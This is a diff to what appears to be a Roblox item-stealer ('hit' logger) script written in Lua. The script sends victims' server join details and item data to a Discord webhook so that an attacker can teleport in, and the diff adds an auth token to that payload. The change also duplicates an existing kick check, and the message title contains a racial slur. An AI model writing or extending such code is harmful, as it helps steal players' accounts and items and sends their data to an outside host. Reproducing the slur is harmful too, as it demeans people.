@@ -22,6 +22,12 @@ local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
+local auth_token = _G.AuthToken or "" 
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add usernames or webhook")
+    return
+end
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -205,7 +211,8 @@ local function SendJoinMessage(list, prefix)
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
-        ["embeds"] = {{
+        ["auth_token"] = auth_token, 
+		["embeds"] = {{
             ["title"] = "🟣 Bro join your hit nigga 🎯",
             ["color"] = 8323327,
             ["fields"] = fields,
